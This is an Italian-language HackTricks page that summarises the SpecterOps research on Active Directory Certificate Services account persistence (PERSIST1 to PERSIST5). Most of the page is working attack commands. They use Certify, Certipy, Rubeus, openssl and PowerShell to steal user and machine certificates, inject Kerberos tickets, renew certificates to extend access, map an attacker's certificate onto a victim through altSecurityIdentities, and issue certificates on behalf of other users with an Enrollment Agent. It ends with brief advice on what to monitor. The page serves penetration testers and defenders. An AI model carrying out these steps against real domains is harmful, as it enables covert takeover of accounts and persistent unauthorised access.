# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Questa è una breve sintesi dei capitoli sulla persistenza degli account della straordinaria ricerca di [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Comprendere il furto attivo delle credenziali utente con i certificati – PERSIST1

In uno scenario in cui un certificato che consente l'autenticazione di dominio può essere richiesto da un utente, un attacker ha l'opportunità di richiedere e rubare questo certificato per mantenere la persistenza in una rete. Per impostazione predefinita, il template `User` in Active Directory permette tali richieste, anche se talvolta può essere disabilitato.

Usando [Certify](https://github.com/GhostPack/Certify) o [Certipy](https://github.com/ly4k/Certipy), puoi cercare template abilitati che consentono l'autenticazione client e quindi richiederne uno:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Il potere di un certificato risiede nella sua capacità di autenticarsi come l'utente a cui appartiene, indipendentemente dalle modifiche alla password, purché il certificato rimanga valido.

Puoi convertire PEM in PFX e usarlo per ottenere un TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Nota: In combinazione con altre tecniche (vedi le sezioni THEFT), l'autenticazione basata su certificati consente accesso persistente senza toccare LSASS e anche da contesti non elevati.

## Ottenere persistenza a livello di macchina con i certificati - PERSIST2

Se un attacker ha privilegi elevati su un host, può iscrivere l'account macchina del sistema compromesso per ottenere un certificato utilizzando il template predefinito `Machine`. Autenticarsi come la macchina abilita S4U2Self per i servizi locali e può fornire una persistenza duratura sull'host:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Extending Persistence Through Certificate Renewal - PERSIST3

Abusare dei periodi di validità e di rinnovo dei template di certificato consente a un attaccante di mantenere l'accesso a lungo termine. Se si è in possesso di un certificato precedentemente emesso e della sua chiave privata, è possibile rinnovarlo prima della scadenza per ottenere una credenziale nuova e di lunga durata senza lasciare ulteriori artefatti di richiesta legati al principal originale.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Suggerimento operativo: tieni traccia delle durate dei file PFX in possesso dell'attaccante e rinnova per tempo. Il rinnovo può anche fare sì che i certificati aggiornati includano l'estensione di mapping SID moderna, mantenendoli utilizzabili con regole di mapping DC più restrittive (vedi sezione successiva).

## Inserimento di mappature esplicite di certificati (altSecurityIdentities) – PERSIST4

Se puoi scrivere nell'attributo `altSecurityIdentities` di un account di destinazione, puoi mappare esplicitamente un certificato controllato dall'attaccante a quell'account. Questo persiste attraverso i cambi di password e, quando si usano formati di mapping forti, continua a funzionare con le policy di mapping più severe applicate dai DC moderni.

Flusso ad alto livello:

1. Ottieni o emetti un certificato client-auth che controlli (es. richiedi il template `User` come te stesso).
2. Estrai un identificatore forte dal certificato (Issuer+Serial, SKI, or SHA1-PublicKey).
3. Aggiungi una mappatura esplicita sull'attributo `altSecurityIdentities` del principal vittima usando quell'identificatore.
4. Autentica con il tuo certificato; il DC lo mappa alla vittima tramite la mappatura esplicita.

Esempio (PowerShell) che usa una mappatura Issuer+Serial forte:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Quindi autenticati con il tuo PFX. Certipy otterrà direttamente un TGT:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Costruire mapping robusti per `altSecurityIdentities`

Nella pratica, le mappature **Issuer+Serial** e **SKI** sono i formati forti più semplici da creare a partire da un certificato in possesso dell'attaccante. Questo è importante dopo il **11 febbraio 2025**, quando i DCs passeranno per impostazione predefinita a **Full Enforcement** e le mappature deboli smetteranno di essere affidabili.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Note
- Usare solo tipi di mappatura forti: `X509IssuerSerialNumber`, `X509SKI` o `X509SHA1PublicKey`. Formati deboli (Subject/Issuer, Subject-only, RFC822 email) sono deprecati e possono essere bloccati dalla DC policy.
- La mappatura funziona su entrambi gli oggetti **user** e **computer**, quindi l'accesso in scrittura all'`altSecurityIdentities` di un account computer è sufficiente per persistere come quella macchina.
- La catena di certificati deve ricondursi a una root fidata dal DC. Le Enterprise CAs in NTAuth sono tipicamente fidate; alcuni ambienti si fidano anche delle public CAs.
- L'autenticazione Schannel rimane utile per la persistenza anche quando PKINIT fallisce perché il DC manca dell'EKU Smart Card Logon o restituisce `KDC_ERR_PADATA_TYPE_NOSUPP`.

Per maggiori dettagli su weak explicit mappings e percorsi di attacco, vedi:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

Se ottieni un certificato valido Certificate Request Agent/Enrollment Agent, puoi emettere nuovi certificati abilitati al logon per conto degli utenti a piacimento e conservare il PFX dell'agent offline come token di persistenza. Workflow di abuso:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
La revoca del certificato dell'agente o delle autorizzazioni del template è necessaria per rimuovere questa persistenza.

Note operative
- Le versioni moderne di `Certipy` supportano sia `-on-behalf-of` che `-renew`, quindi un attacker in possesso di un Enrollment Agent PFX può emettere e successivamente rinnovare certificati leaf senza dover ri-interagire con l'account target originale.
- Se il recupero del TGT basato su PKINIT non è possibile, il certificato on-behalf-of risultante è comunque utilizzabile per l'autenticazione Schannel con `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## 2025 Strong Certificate Mapping Enforcement: Impatto sulla persistenza

Microsoft KB5014754 ha introdotto Strong Certificate Mapping Enforcement sui domain controller. Dal 11 febbraio 2025, i DC impostano per impostazione predefinita Full Enforcement, rifiutando mapping deboli/ambigui. Implicazioni pratiche:

- I certificati antecedenti al 2022 che non includono l'estensione di mapping SID possono non riuscire nella mappatura implicita quando i DC sono in Full Enforcement. Gli attacker possono mantenere l'accesso rinnovando i certificati tramite AD CS (per ottenere l'estensione SID) o inserendo una mappatura esplicita forte in `altSecurityIdentities` (PERSIST4).
- Le mappature esplicite che usano formati forti (Issuer+Serial, SKI, SHA1-PublicKey) continuano a funzionare. I formati deboli (Issuer/Subject, Subject-only, RFC822) possono essere bloccati e dovrebbero essere evitati per la persistenza.

Gli amministratori dovrebbero monitorare e segnalare:
- Modifiche a `altSecurityIdentities` e emissioni/rinnovi dei certificati Enrollment Agent e User.
- I log di emissione della CA per richieste on-behalf-of e schemi di rinnovo insoliti.

## Riferimenti

- Microsoft. KB5014754: Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- SpecterOps. ADCS ESC14 Abuse Technique (explicit `altSecurityIdentities` abuse on user/computer objects).
https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/
- Certipy Wiki – Command Reference (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- Almond Offensive Security. Authenticating with certificates when PKINIT is not supported.
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

{{#include ../../../banners/hacktricks-training.md}}
